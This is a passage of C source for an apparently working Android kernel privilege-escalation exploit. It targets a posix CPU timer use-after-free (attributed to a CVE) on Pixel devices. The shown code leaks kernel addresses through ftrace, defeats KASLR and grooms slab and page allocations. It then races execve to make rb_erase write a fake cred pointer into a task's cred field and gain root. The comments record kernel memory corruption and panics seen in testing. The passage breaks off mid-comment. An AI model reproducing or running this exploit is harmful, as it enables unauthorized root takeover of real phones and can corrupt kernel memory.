/* Adapted from yoro1836/SamTimer ae73308f0f1be1436e9272c3cdb1e05585d62f73.
 * Upstream credits woshigenm/CVE-2026-98260 (MIT) and the aurora port.
 * Pixel-specific profile, entry points and worker are in offsets.h/pixel_main.inc.
 * Temporary runtime root only. Failed races may require a reboot.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <grp.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define TR "/sys/kernel/tracing"
#define CPU_TRIG 2
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 3
#define SOCKBUF 8192

/* All kernel-build-specific constants (sites, cache sizes, struct offsets,
 * link-time symbols) live in offsets.h; only exploit tuning stays here. */
#include "offsets.h"

/* (selinux_state / panic_on_warn / workqueue-UMH constants: offsets.h) */
/* (umh struct layouts + ROOT_UMH_* page slots: offsets.h) */
/* (DEFEX creds_hash, cred/task field offsets, init_* symbols: offsets.h) */

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct child_report
{
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_timer_go_r = -1, g_timer_go_w = -1;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static unsigned long long g_slide;
static int g_slide_set;
static int g_held;
/*
 * True while the root child runs with task->cred pointing into the fake
 * pool page: that page must not be freed (park_forever skips the drain).
 */
static int g_cred_live;
static int g_fake_stage;
static unsigned long long g_child_task;
static unsigned g_t_page_alloc, g_t_page_free;

static void logf(const char *fmt, ...);

static void slab_usage(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
        return;
    while (fgets(line, sizeof(line), f))
    {
        unsigned active = 0, total = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
            logf("[slab] %s active=%u total=%u\n", tag, active, total);
        break;
    }
    fclose(f);
}

static void logf(const char *fmt, ...)
{
    /* [+ms] elapsed-since-first-log prefix: makes the per-stage cost
     * (leak, each plant, each repair, late-load) visible in the log so
     * the slow spots can be measured instead of guessed. */
    static struct timespec t0;
    struct timespec now;
    va_list ap;

    clock_gettime(CLOCK_MONOTONIC, &now);
    if (!t0.tv_sec)
        t0 = now;
    long long ms = (long long)(now.tv_sec - t0.tv_sec) * 1000LL +
                   (long long)(now.tv_nsec - t0.tv_nsec) / 1000000LL;
    printf("[+%5lld.%03llds] ", ms / 1000LL, ms % 1000LL);

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    (void)fsync(STDOUT_FILENO);
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}
static void pin(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set)) {
        perror("sched_setaffinity");
        _exit(2);
    }
}
static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

static void enable_events(void)
{
    /*
     * The per-cpu trace buffer defaults to a few kB and the kmem events
     * flood it in milliseconds on a busy system, which starves every scan
     * (discover_page_types sees partial alloc/free pairs).  Grow it first
     * so the payload is self-contained instead of relying on the app to
     * have done it.
     */
    wr(TR "/buffer_size_kb", "8192\n");
    /*
     * Event triggers persist in tracefs across runs (and even reboots of
     * the tracing state), and re-registering a trigger that already exists
     * fails with EEXIST.  A leftover "disable_event:kmem:kmalloc" from an
     * earlier run keeps firing on rss_stat and silently turns the pipe
     * leak blind, so remove every form first (ignore failures), then
     * register the enables.  The bare syntax is correct; the ":unlimited"
     * suffix is just how tracefs displays the parsed trigger count.
     */
    static const char *evs[] = {
        "!disable_event:kmem:kmalloc\n",
        "!disable_event:kmem:kmem_cache_alloc\n",
        "!disable_event:kmem:kmem_cache_alloc_node\n",
        "!disable_event:kmem:mm_page_free\n",
        "!disable_event:kmem:mm_page_alloc\n",
        "!enable_event:kmem:kmem_cache_alloc\n",
        "!enable_event:kmem:kmem_cache_alloc_node\n",
        "!enable_event:kmem:mm_page_free\n",
        "!enable_event:kmem:mm_page_alloc\n",
        "!enable_event:kmem:kmalloc\n",
        "enable_event:kmem:kmem_cache_alloc\n",
        /* dup_task_struct() allocates via kmem_cache_alloc_node; without
         * this event the child task_struct address is never traced. */
        "enable_event:kmem:kmem_cache_alloc_node\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

/* Pixel (VA_BITS=39) KASLR slide must land in [2^36, 3*2^36) on a 2MB
 * boundary; anything else is a mis-scan or a different build. */
static int slide_in_range(unsigned long long slide)
{
    return slide >= KASLR_MIN_SLIDE && slide < KASLR_MAX_SLIDE &&
           !(slide & KASLR_SLIDE_ALIGN);
}

/*
 * Raw ftrace field layout (per-boot ids have no readable metadata):
 *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
 *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
 */
static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out, int max,
                             unsigned long long *first_site)
{
    /*
     * Identify the k_itimer allocation site dynamically.  The KASLR slide on
     * this kernel has sub-2MB granularity, so the low 21 bits of the call
     * site are not constant across boots and must not be compared against a
     * hard-coded value.  Instead, the target allocations (CLOCK_*_CPUTIME
     * timer_create) all come from a single call site (do_timer_create), so
     * the dominant site among this pid's TIMER_ALLOC kernel allocations is
     * that call site.
     */
    unsigned long long cand_site[8];
    int cand_cnt[8];
    int nc = 0;

    for (int k = 0; k < 8; k++)
        cand_site[k] = 0, cand_cnt[k] = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr;
        int f = 0;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        ptr = u64(b, i + 8);
        if (u64(b, i + 16) != TIMER_ALLOC ||
            u64(b, i + 24) != TIMER_ALLOC || !is_kernel_ptr(ptr))
            continue;
        for (int k = 0; k < nc; k++)
            if (cand_site[k] == site)
            {
                cand_cnt[k]++;
                f = 1;
                break;
            }
        if (!f && nc < 8)
        {
            cand_site[nc] = site;
            cand_cnt[nc] = 1;
            nc++;
        }
    }
    if (!nc)
        return 0;
    {
        int best = 0;

        for (int k = 1; k < nc; k++)
            if (cand_cnt[k] > cand_cnt[best])
                best = k;
        unsigned long long dom = cand_site[best];
        int cnt = 0;

        for (size_t i = 8; i + 32 <= n; i += 4)
        {
            unsigned long long site, ptr;

            if (u32(b, i - 4) != (unsigned)pid)
                continue;
            site = u64(b, i);
            if (site != dom)
                continue;
            ptr = u64(b, i + 8);
            if (u64(b, i + 16) != TIMER_ALLOC ||
                u64(b, i + 24) != TIMER_ALLOC || !is_kernel_ptr(ptr))
                continue;
            if (!cnt && first_site)
                *first_site = site;
            if (cnt < max)
                out[cnt++] = ptr;
        }
        return cnt;
    }
}

static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *site_out,
                            unsigned long long *ptr_out)
{
    int found = 0;

    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        if (!is_kernel_ptr(ptr) || u64(b, i + 8) != CRED_REQ ||
            u64(b, i + 16) != CRED_ALLOC)
            continue;
        site = u64(b, i - 8);
        if (!is_kernel_ptr(site))
            continue;
        logf("  [credscan] cred=%#llx site_low=%#llx (n=%d)\n", ptr,
             site & 0x1fffff, found);
        /*
         * Keep the FIRST allocation: it is prepare_exec_creds(), the cred
         * that commit_creds() installs as the child's live cred.  Later
         * same-size allocs from the child are transient (alloc/free churn,
         * e.g. do_faccessat's prepare_creds/override_creds/revert_creds)
         * and are already freed when the write fires.
         */
        if (!found)
        {
            *site_out = site;
            *ptr_out = ptr;
        }
        found++;
    }
    return found;
}

static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *out,
                            unsigned long long *site_out,
                            unsigned long long expect_site)
{
    int found = 0;
    unsigned long long last_site = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr, req, alloc;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        /*
         * The KASLR slide on this kernel has 2MB granularity, so a
         * hard-coded low-21-bit filter never matches.  Match the exact
         * runtime call site instead: dup_task_struct's
         * kmem_cache_alloc_node return address plus this boot's slide.
         */
        if (expect_site && site != expect_site)
            continue;
        ptr = u64(b, i + 8);
        req = u64(b, i + 16);
        alloc = u64(b, i + 24);
        if (!is_kernel_ptr(ptr))
            continue;
        /* task_struct_cachep object_size is sizeof(struct task_struct),
         * 0x12c0; it is 64-byte aligned so bytes_alloc is the same. */
        if (req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES)
            continue;
        *out = ptr;
        last_site = site;
        found++;
    }
    if (site_out)
        *site_out = last_site;
    return found;
}

static int scan_page_free(const unsigned char *b, size_t n,
                          unsigned long long pfn)
{
    for (size_t i = 8; i + 12 <= n; i += 4)
    {
        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) == g_t_page_free)
            return 1;
    }
    return 0;
}

struct page_pair
{
    unsigned long long pfn;
    unsigned alloc_type, free_type, hits;
};

/*
 * Page event ids are assigned at boot and the tracefs metadata is root-only.
 * Allocate/free anonymous pages and pair the same pfn: first alloc, then free.
 */
static int discover_page_types(unsigned char *raw)
{
    struct page_pair pairs[2048] = {0};
    int np = 0, me = getpid();
    size_t len = 1024 * PAGE;
    unsigned char *m;
    long n;

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < TRACE_CPUS; c++)
        drain_cpu(c);
    trace_start();
    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
    {
        trace_stop();
        return -1;
    }
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    munmap(m, len);
    usleep(30000);
    trace_stop();

    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return -1;
    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26))
            continue;
        order = u32(raw, i + 8);
        if (order > 10)
            continue;
        if (u32(raw, i - 4) != (unsigned)me)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (!type || type > 1024)
            continue;
        for (int k = 0; k < np; k++)
        {
            if (pairs[k].pfn == pfn)
            {
                if (!pairs[k].alloc_type)
                    pairs[k].alloc_type = type;
                else if (!pairs[k].free_type)
                    pairs[k].free_type = type;
                pairs[k].hits++;
                goto next;
            }
        }
        if (np < 2048)
        {
            pairs[np].pfn = pfn;
            pairs[np].alloc_type = type;
            pairs[np].hits = 1;
            np++;
        }
    next:;
    }

    {
        struct page_pair *best = NULL;

        for (int k = 0; k < np; k++)
            if (pairs[k].alloc_type && pairs[k].free_type &&
                pairs[k].alloc_type != pairs[k].free_type &&
                (!best || pairs[k].hits > best->hits))
                best = &pairs[k];
        if (!best)
        {
            logf("[-] page event ids not found (records=%zu pairs=%d)\n",
                 (size_t)n, np);
            return -1;
        }
        g_t_page_alloc = best->alloc_type;
        g_t_page_free = best->free_type;
    }
    logf("[ids] page_alloc=%u page_free=%u pairs=%d\n",
         g_t_page_alloc, g_t_page_free, np);
    return 0;
}

/*
 * Vote the linear-map base from the target's timer slabs and same-PID order-1
 * page_alloc pfns.  Partial-slab pairings are noise; the true base wins by
 * roughly one vote per slab.
 */
struct base_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                     const unsigned long long *ptrs, int nrec,
                                     int *out_slabs, int *out_pfns)
{
    enum
    {
        MAXS = 256,
        MAXP = 512,
        HBITS = 16,
        HSIZE = 1 << HBITS
    };
    unsigned long long slabs[MAXS], pfns[MAXP];
    static struct base_slot tab[HSIZE];
    int ns = 0, np = 0;
    unsigned long long best_base = 0, best_cnt = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nrec && ns < MAXS; i++)
    {
        unsigned long long s = ptrs[i] & ~0x1fffULL;
        int dup = 0;

        for (int j = 0; j < ns; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[ns++] = s;
    }
    for (size_t i = 16; i + 12 <= n && np < MAXP; i += 4)
    {
        unsigned long long pfn = u64(b, i);
        int dup = 0;

        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != 1 ||
            u32(b, i - 4) != (unsigned)pid ||
            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        for (int j = 0; j < np; j++)
            if (pfns[j] == pfn)
            {
                dup = 1;
                break;
            }
        if (!dup)
            pfns[np++] = pfn;
    }
    for (int i = 0; i < ns; i++)
    {
        for (int j = 0; j < np; j++)
        {
            unsigned long long base = slabs[i] - (pfns[j] << 12);
            unsigned h = (unsigned)((base >> 12) * 2654435761u) &
                         (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && (unsigned long long)tab[i].cnt > best_cnt)
        {
            best_cnt = tab[i].cnt;
            best_base = tab[i].key;
        }
    *out_slabs = ns;
    *out_pfns = np;
    return best_cnt >= 8 ? best_base : 0;
}

static unsigned long long calibrate_base(unsigned char *raw)
{
    unsigned long long hist[64] = {0}, hcnt[64] = {0};
    unsigned long long recent[64], timer_site = 0;
    unsigned long long ptrs[512];
    int hc = 0, rn = 0, made = 0, me = getpid();
    long n;

    trace_start();
    for (int i = 0; i < 512; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return 0;

    {
        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, &timer_site);

        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
        {
            unsigned long long pfn = u64(raw, i);

            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != 1 ||
                u32(raw, i - 4) != (unsigned)me ||
                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
                continue;
            if (rn == 64)
                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
            recent[rn++] = pfn;
        }
        logf("[base-diag] made=%d timer_allocs(c)=%d order1_pfn(rn)=%d page_alloc_id=%u\n",
             made, c, rn, g_t_page_alloc);
        for (int i = 0; i < c; i++)
        {
            unsigned long long slab = ptrs[i] & ~0x1fffULL;

            for (int j = 0; j < rn; j++)
            {
                unsigned long long base = slab - (recent[j] << 12);
                int f = 0;

                for (int k = 0; k < hc; k++)
                    if (hist[k] == base)
                    {
                        hcnt[k]++;
                        f = 1;
                        break;
                    }
                if (!f && hc < 64)
                {
                    hist[hc] = base;
                    hcnt[hc] = 1;
                    hc++;
                }
            }
        }
    }
    {
        unsigned long long best = 0, bestc = 0;

        for (int k = 0; k < hc; k++)
            if (hcnt[k] > bestc)
            {
                bestc = hcnt[k];
                best = hist[k];
            }
        logf("[base] made=%d best=%#llx count=%llu\n", made, best, bestc);
        logf("[profile] observed timer site=%#llx expected=%#llx delta=%#llx\n",
             timer_site, STATIC_TIMER_SITE, timer_site - STATIC_TIMER_SITE);
        if (timer_site < STATIC_TIMER_SITE)
            return 0;
        g_slide = timer_site - STATIC_TIMER_SITE;
        if (!slide_in_range(g_slide))
        {
            logf("[profile] timer slide=%#llx outside KASLR range [%#llx,%#llx)\n",
                 g_slide, KASLR_MIN_SLIDE, KASLR_MAX_SLIDE);
            return 0;
        }
        logf("[profile] timer site=%#llx slide=%#llx (candidate)\n",
             timer_site, g_slide);
        return bestc >= 4 ? best : 0;
    }
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++)
    {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
}

/*
 * Drain the posix_timers_cache SLUB partial list.  If the victim slab stays
 * on the partial list instead of returning to the buddy allocator, our
 * order-1 reclaim can never land on it.  Freeing every held timer and then
 * churning a large batch (alloc+free) empties the partial slabs so the next
 * freed victim slab goes back to the buddy, where the spray picks it up.
 */
static void drain_timers(void)
{
    struct sigevent ev;
    static timer_t tmp[4096];

    if (g_prefill)
    {
        for (int i = 0; i < PREFILL_TIMERS; i++)
            timer_delete(g_prefill[i]);
        free(g_prefill);
        g_prefill = NULL;
    }
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < 1024; i++)
        timer_create(CLOCK_MONOTONIC, &ev, &tmp[i]);
    for (int i = 0; i < 1024; i++)
        timer_delete(tmp[i]);
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE))
        return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++)
    {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base;
    g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;
    pin(slot ? 3 : 1);
    while (!atomic_load(&g_go))
        sched_yield();
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop))
    {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}
static int killer_fn(void *x)
{
    int tid, tgid;
    (void)x;
    pin(2);
    while (!(tid = atomic_load(&g_exec_tid)))
        sched_yield();
    tgid = atomic_load(&g_target_tgid);
    for (;;)
    {
        long r = syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH)
            break;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}
static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED)
        return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0)
        munmap(st, HELPER_STACK);
    return p;
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {(char *)"", NULL};
    char *const envp[] = {NULL};
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1)
        _exit(117);
    if (read(g_ack_r, &ack, 1) != 1)
        _exit(118);

    for (int i = 0; i < NTIMERS; i++)
    {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
            _exit(120);
        if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
            _exit(121);
    }
    {
        int tid = (int)syscall(SYS_gettid);
        atomic_store(&g_exec_tid, tid);
        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
            _exit(122);
    }
    /* Keep the target paused until the parent has captured V and armed the
     * spray; the free still has not happened at this point. */
    if (g_timer_go_r >= 0)
    {
        char tgo;

        if (read(g_timer_go_r, &tgo, 1) != 1)
            _exit(124);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS)
        sched_yield();
    for (volatile unsigned long i = 0; i < 5000000UL; i++)
        __asm__ volatile("" ::: "memory");
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    atomic_store(&g_target_tgid, (int)getpid());
    pin(2);
    if (prepare_fragmented_range())
        _exit(110);
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0)
            _exit(111);
    if (spawn_vm_helper(killer_fn) < 0)
        _exit(112);
    sigemptyset(&set);
    sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL))
        _exit(114);
    for (;;)
        sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = {.tv_nsec = 200000};
    for (int i = 0; i < 25000; i++)
    {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid)
            return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void drain_spray(int fake);

static void park_forever(const char *why)
{
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    fflush(stdout);
    /*
     * Stop the vm helpers before sleeping: the lockers spin mprotect loops
     * pinned to CPUs 1/3 and the killer spins tgkill on CPU 2, and a parked
     * parent never reaps them.  Left running they starve the softdog kthread
     * and the phone panics with "Software Watchdog Timer expired 100s"
     * a few minutes later.  g_stop ends the mprotect loop; exec_tid=1 makes
     * the killer's tgkill fail with ESRCH (no such tid in the target) so it
     * takes its exit path instead of spinning forever.
     */
    atomic_store(&g_exec_tid, 1);
    atomic_store(&g_stop, 1);
    /*
     * Release every spray page before sleeping.  A parked process holding
     * ~2GB of queued skb/pipe data starves kernel threads and the softdog
     * panics the phone ~100s later (verified twice in kmsg).  Freeing the
     * pages is safe here: caught payload pages are only needed until their
     * erase fires (run_plant drains those itself on every exit path), and
     * the one page that must survive -- the fake cred the root child runs
     * on -- is kept by the g_cred_live guard below.
     */
    if (!g_cred_live)
    {
        drain_spray(0);
        drain_spray(1);
    }
    /*
     * Survive the caller's teardown.  Shizuku kills the whole process
     * group when the UserService is unbound, and an interactive adb shell
     * sends SIGHUP on disconnect.  Either death reparents the held
     * zombies to init, which reaps them -- release_task() then runs
     * cleanup_timerqueue() on their stale nodes, which sit inside pages
     * the drain just freed and the allocator already handed out again.
     * That use-after-free write corrupts arbitrary live kernel data
     * (observed: system-wide app kills, damaged on-disk file metadata,
     * panic).  Detach into our own session and ignore the catchable
     * termination signals; only SIGKILL or the reboot that reverts
     * everything may end this holder.
     */
    signal(SIGTERM, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    (void)setsid();
    /* Mark the holder clearly: killing it may reap stale nodes. */
    (void)prctl(PR_SET_NAME, "timer-holder", 0, 0, 0);
    for (;;)
        pause();
}

/*
 * Stale timer node layout inside the reclaimed order-1 page.
 *   zero: parent=0 -> rb_erase writes 0 to target.
 *   fake: parent=node -> rb_erase writes node to target (task->cred); the
 *         fake cred fields are overlaid at the same offset by run_plant.
 */
static void build_payload(unsigned char *buf, size_t off,
                          unsigned long long parent, unsigned long long target)
{
    /*
     * Single node at `off` only.  The frag page_offset is 0 (verified in
     * disasm), so the node lands exactly at V+0x78.  Do NOT tile at a 0x18
     * stride in mode 2: the extra parent/target pairs land inside the fake
     * cred (egid/fsuid +0x18, session_keyring +0x58, process_keyring +0x60,
     * request_key_auth +0x70) and the child oopses the moment it reads its
     * cred.  A memset-0 remainder is safe: rb_next() on a zeroed node
     * returns NULL, so the posix-cpu-timers exit loop still terminates.
     */
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x00) = parent;
    *(unsigned long long *)(buf + off + 0x10) = target;
}

struct plant_res
{
    unsigned long long A;
    int ok;
    int retry;
};

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw,
                      unsigned long long static_target);

/*
 * Failed-plant zombie: the trigger's timer node is freed while still linked
 * ("stale"), so a reap would run timerqueue_del on reused memory.  Instead of
 * holding the zombie forever, make the reap safe first: posix_cpu_timers_exit
 * walks each queue via its rb_leftmost pointer and skips a queue whose
 * leftmost is NULL (verified in our vmlinux: LDR X20,[X19,#0x7A0]; CBZ).
 * Zero the three leftmost slots in the zombie's task_struct with zero plants,
 * then reap normally -- no zombie remains, so a dying holder can never hand
 * stale nodes to init's reaper.
 *
 * Three zero plants, each retried; if any cannot land the zombie is held
 * (g_held) exactly like before, so the old behaviour is the fallback.
 */
static int g_repairing;

/* loginuid read-back for the repair probe (world-readable, unlike
 * panic_on_warn which is root-only on Samsung builds). */
static long read_loginuid(pid_t p)
{
    char path[64], buf[32];
    int fd, n;

    snprintf(path, sizeof(path), "/proc/%d/loginuid", (int)p);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
    n = (int)read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0)
        return -1;
    buf[n] = 0;
    return strtol(buf, NULL, 10);
}

static void repair_zombie(pid_t z, unsigned long long ztask,
                          unsigned char *raw, int tag)
{
    static const unsigned long long slots[3] = {
        /* queue leftmosts only: the posix_cpu_timers_exit walk reads the
         * leftmost first and skips the whole queue when it is NULL, so the
         * queue roots are never dereferenced -- zeroing them would just be
         * three extra (and failure-prone) plants per zombie. */
        OFF_TQ_LEFTMOST_0, OFF_TQ_LEFTMOST_1, OFF_TQ_LEFTMOST_2
    };

    if (!ztask || (ztask & 0x3f) || g_repairing || !g_slide_set)
    {
        logf("[-] plant%d zombie %d cannot repair (task=%#llx slide=%d) "
             "-- held\n",
             tag, z, ztask, g_slide_set);
        g_held++;
        return;
    }
    g_repairing = 1;
    {
        /*
         * Round-trip probe first: the repair writes are kernel writes we
         * cannot read back directly, and a "successful" plant is only a
         * heuristic.  The zombie's loginuid (task+OFF_TASK_LOGINUID) is
         * written through the same pipeline and read back through
